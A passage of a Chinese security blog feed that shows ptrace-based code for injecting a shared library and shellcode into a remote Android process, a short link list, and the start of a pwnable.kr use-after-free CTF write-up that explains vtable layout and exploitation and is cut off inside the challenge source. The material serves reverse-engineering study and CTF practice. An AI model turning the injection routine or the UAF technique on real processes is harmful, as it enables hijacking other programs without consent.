class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将so库中需要调用的函数名称写入到远程进程内存空间中</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_writedata(pid, RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>, FunctionName, <span class="built_in">strlen</span>(FunctionName) + <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Write FunctionName:%s to RemoteProcess error"</span>, FunctionName);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置dlsym的参数，返回值为远程进程内函数的地址</span></span><br><span class="line"><span class="comment">// void *dlsym(void *handle, const char *symbol);</span></span><br><span class="line">parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteModuleAddr;</span><br><span class="line">parameters[<span class="number">1</span>] = (<span class="keyword">long</span>)(RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlsym_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote dlsym Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RemoteModuleFuncAddr为远程进程空间内获取的函数地址</span></span><br><span class="line">RemoteModuleFuncAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">LOGD(<span class="string">"Remote Process ModuleFunc Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleFuncAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)RemoteModuleFuncAddr, FuncParameter, NumParameter, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote injected Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_setregs(pid, &amp;OriginalRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Recover reges failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line">LOGD(<span class="string">"Recover Regs Success"</span>);</span><br><span class="line">ptrace_getregs(pid, &amp;CurrentRegs);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Set Regs Error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Detach</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_detach(pid) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"ptrace detach failed"</span>);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过shellcode方式ptrace注入so模块到远程进程中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，LibPath为被远程注入的so模块路径，FunctionName为远程注入的模块后调用的函数</span></span><br><span class="line"><span class="comment">  FuncParameter指向被远程调用函数的参数（若传递字符串，需要先将字符串写入到远程进程空间中），NumParameter为参数的个数</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示注入成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process_shellcode</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> iRet = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">CurrentRegs</span>, <span class="title">OriginalRegs</span>;</span>  <span class="comment">// CurrentRegs表示远程进程中当前的寄存器值，OriginalRegs存储注入前的寄存器值，方便恢复</span></span><br><span class="line"><span class="keyword">void</span> *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;   <span class="comment">// 远程进程中需要调用函数的地址</span></span><br><span class="line"><span class="keyword">void</span> *RemoteMapMemoryAddr, *RemoteModuleAddr, *RemoteModuleFuncAddr; <span class="comment">// RemoteMapMemoryAddr为远程进程空间中映射的内存基址，RemoteModuleAddr为远程注入的so模块加载基址，RemoteModuleFuncAddr为注入模块中需要调用的函数地址</span></span><br><span class="line"><span class="keyword">long</span> parameters[<span class="number">10</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *dlopen_param1_ptr, *dlsym_param2_ptr, *saved_r0_pc_ptr, *inject_param_ptr, *remote_code_start_ptr, *local_code_start_ptr, *local_code_end_ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> _dlopen_addr_s, _dlopen_param1_s, _dlopen_param2_s, _dlsym_addr_s, \</span><br><span class="line">_dlsym_param2_s, _dlclose_addr_s, _inject_start_s, _inject_end_s, _inject_function_param_s, \</span><br><span class="line">_saved_cpsr_s, _saved_r0_pc_s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> code_length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attach远程进程</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_attach(pid) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取远程进程的寄存器值</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_getregs(pid, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">"ARM_r0:0x%lx, ARM_r1:0x%lx, ARM_r2:0x%lx, ARM_r3:0x%lx, ARM_r4:0x%lx, ARM_r5:0x%lx, ARM_r6:0x%lx, ARM_r7:0x%lx, ARM_r8:0x%lx, ARM_r9:0x%lx, ARM_r10:0x%lx, ARM_ip:0x%lx, ARM_sp:0x%lx, ARM_lr:0x%lx, ARM_pc:0x%lx"</span>, \</span><br><span class="line">CurrentRegs.ARM_r0, CurrentRegs.ARM_r1, CurrentRegs.ARM_r2, CurrentRegs.ARM_r3, CurrentRegs.ARM_r4, CurrentRegs.ARM_r5, CurrentRegs.ARM_r6, CurrentRegs.ARM_r7, CurrentRegs.ARM_r8, CurrentRegs.ARM_r9, CurrentRegs.ARM_r10, CurrentRegs.ARM_ip, CurrentRegs.ARM_sp, CurrentRegs.ARM_lr, CurrentRegs.ARM_pc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存远程进程空间中当前的上下文寄存器环境</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取mmap函数在远程进程中的地址</span></span><br><span class="line">mmap_addr = GetRemoteFuncAddr(pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">LOGD(<span class="string">"mmap RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)mmap_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置mmap的参数</span></span><br><span class="line"><span class="comment">// void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</span></span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 设置为NULL表示让系统自动选择分配内存的地址    </span></span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="number">0x4000</span>; <span class="comment">// 映射内存的大小    </span></span><br><span class="line">    parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// 表示映射内存区域可读可写可执行   </span></span><br><span class="line">    parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// 建立匿名映射    </span></span><br><span class="line">    parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//  若需要映射文件到内存中，则为文件的fd  </span></span><br><span class="line">    parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//文件映射偏移量 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用远程进程的mmap函数，建立远程进程的内存映射</span></span><br><span class="line"><span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)mmap_addr, parameters, <span class="number">6</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">LOGD(<span class="string">"Call Remote mmap Func Failed"</span>);</span><br><span class="line">ptrace_detach(pid);</span><br><span class="line"><span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取mmap函数执行后的返回值，也就是内存映射的起始地址</span></span><br><span class="line">RemoteMapMemoryAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">LOGD(<span class="string">"Remote Process Map Memory Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteMapMemoryAddr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别获取dlopen、dlsym、dlclose等函数的地址</span></span><br><span class="line">dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlopen);</span><br><span class="line">dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlsym);</span><br><span class="line">dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlclose);</span><br><span class="line">dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlerror);</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">"dlopen RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlopen_addr);</span><br><span class="line">LOGD(<span class="string">"dlsym RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlsym_addr);</span><br><span class="line">LOGD(<span class="string">"dlclose RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlclose_addr);</span><br><span class="line">LOGD(<span class="string">"dlerror RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlerror_addr);</span><br><span class="line"></span><br><span class="line">remote_code_start_ptr = RemoteMapMemoryAddr + <span class="number">0x3C00</span>;    <span class="comment">// 远程进程中存放shellcode代码的起始地址</span></span><br><span class="line">local_code_start_ptr = (<span class="keyword">uint8_t</span> *)&amp;_inject_start_s;     <span class="comment">// 本地进程中shellcode的起始地址</span></span><br><span class="line">local_code_end_ptr = (<span class="keyword">uint8_t</span> *)&amp;_inject_end_s;          <span class="comment">// 本地进程中shellcode的结束地址</span></span><br><span class="line"></span><br><span class="line">_dlopen_addr_s = (<span class="keyword">uint32_t</span>)dlopen_addr;</span><br><span class="line">_dlsym_addr_s = (<span class="keyword">uint32_t</span>)dlsym_addr;</span><br><span class="line">_dlclose_addr_s = (<span class="keyword">uint32_t</span>)dlclose_addr;</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">"Inject Code Start:0x%x, end:0x%x"</span>, (<span class="keyword">int</span>)local_code_start_ptr, (<span class="keyword">int</span>)local_code_end_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算shellcode中一些变量的存放起始地址</span></span><br><span class="line">code_length = (<span class="keyword">uint32_t</span>)&amp;_inject_end_s - (<span class="keyword">uint32_t</span>)&amp;_inject_start_s;</span><br><span class="line">dlopen_param1_ptr = local_code_start_ptr + code_length + <span class="number">0x20</span>;</span><br><span class="line">dlsym_param2_ptr = dlopen_param1_ptr + MAX_PATH;</span><br><span class="line">saved_r0_pc_ptr = dlsym_param2_ptr + MAX_PATH;</span><br><span class="line">inject_param_ptr = saved_r0_pc_ptr + MAX_PATH;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入dlopen的参数LibPath</span></span><br><span class="line"><span class="built_in">strcpy</span>( dlopen_param1_ptr, LibPath );</span><br><span class="line">_dlopen_param1_s = REMOTE_ADDR( dlopen_param1_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入dlsym的第二个参数，需要调用的函数名称</span></span><br><span class="line"><span class="built_in">strcpy</span>( dlsym_param2_ptr, FunctionName );</span><br><span class="line">_dlsym_param2_s = REMOTE_ADDR( dlsym_param2_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存cpsr寄存器</span></span><br><span class="line">_saved_cpsr_s = OriginalRegs.ARM_cpsr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存r0-pc寄存器</span></span><br><span class="line"><span class="built_in">memcpy</span>( saved_r0_pc_ptr, &amp;(OriginalRegs.ARM_r0), <span class="number">16</span> * <span class="number">4</span> ); <span class="comment">// r0 ~ r15</span></span><br><span class="line">_saved_r0_pc_s = REMOTE_ADDR( saved_r0_pc_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>( inject_param_ptr, FuncParameter, NumParameter );</span><br><span class="line">_inject_function_param_s = REMOTE_ADDR( inject_param_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line">ptrace_writedata( pid, remote_code_start_ptr, local_code_start_ptr, <span class="number">0x400</span> );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>( &amp;CurrentRegs, &amp;OriginalRegs, <span class="keyword">sizeof</span>(CurrentRegs) );</span><br><span class="line">CurrentRegs.ARM_sp = (<span class="keyword">long</span>)remote_code_start_ptr;</span><br><span class="line">CurrentRegs.ARM_pc = (<span class="keyword">long</span>)remote_code_start_ptr;</span><br><span class="line">ptrace_setregs( pid, &amp;CurrentRegs );</span><br><span class="line">ptrace_detach( pid );</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Zygote注入技术的实现"><a href="#Zygote注入技术的实现" class="headerlink" title="Zygote注入技术的实现"></a>Zygote注入技术的实现</h2>]]></content>
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>sakuraのLibrary</title>
      <link href="/2018/02/14/shouji/"/>
      <url>/2018/02/14/shouji/</url>
      <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>Kaggle推出免费线上课程，覆盖机器学习、深度学习等四门课<br><a href="https://www.kaggle.com/learn/machine-learning" target="_blank" rel="noopener">https://www.kaggle.com/learn/machine-learning</a></p><h1 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h1><h2 id="手把手教你构建-C-语言编译器（其实是解释器）"><a href="#手把手教你构建-C-语言编译器（其实是解释器）" class="headerlink" title="手把手教你构建 C 语言编译器（其实是解释器）"></a>手把手教你构建 C 语言编译器（其实是解释器）</h2><p><a href="http://lotabout.me/2015/write-a-C-interpreter-0/" target="_blank" rel="noopener">http://lotabout.me/2015/write-a-C-interpreter-0/</a></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>pwnable.kr UAF writeup</title>
      <link href="/2018/02/13/uaf/"/>
      <url>/2018/02/13/uaf/</url>
      <content type="html"><![CDATA[<h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><ul><li>虚函数的内存地址空间</li><li>UAF</li></ul><h2 id="前置知识1：虚函数的内存地址空间"><a href="#前置知识1：虚函数的内存地址空间" class="headerlink" title="前置知识1：虚函数的内存地址空间"></a>前置知识1：虚函数的内存地址空间</h2><p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。<br>对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013327.jpg" alt=""></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::f"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::g"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::h"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> base; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类1，无虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child1</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::f1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::g1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::h1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child1; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类2，有1个虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child2</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::f"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::g2"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::h2"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child2; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="单一继承，无虚函数重载"><a href="#单一继承，无虚函数重载" class="headerlink" title="单一继承，无虚函数重载"></a>单一继承，无虚函数重载</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013745.jpg" alt=""></p><h3 id="单一继承，重载了虚函数"><a href="#单一继承，重载了虚函数" class="headerlink" title="单一继承，重载了虚函数"></a>单一继承，重载了虚函数</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013807.jpg" alt=""></p><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013830.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013904.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。<strong>注意这并不是直接继承了私有(private)虚函数</strong></li><li>当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。</li><li>vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr</li></ul><h2 id="前置知识2：Use-After-Free"><a href="#前置知识2：Use-After-Free" class="headerlink" title="前置知识2：Use-After-Free"></a>前置知识2：Use-After-Free</h2><h3 id="Dangling-pointer"><a href="#Dangling-pointer" class="headerlink" title="Dangling pointer"></a>Dangling pointer</h3><p><a href="https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88" target="_blank" rel="noopener">Dangling pointer</a><br>Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。</p><h3 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h3><p>对Dangling pointer所指向内存进行use，如指针解引用等。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串）</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> (*func)() <span class="comment">//函数指针，可以理解为类里面的方法</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设有上述这样的一个结构体指针p。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-060816.jpg" alt="">在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。<br>之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。<br>然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为<strong>此时p指针指向的内存包含的已经是完全不同的数据</strong></p><ul><li>任意地址读：puts(p-&gt;name)—————&gt;puts(char*(addr2))</li><li>任意地址写：strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)</li><li>控制流劫持：p-&gt;func()———————&gt;call addr3</li></ul><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp</a></p><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 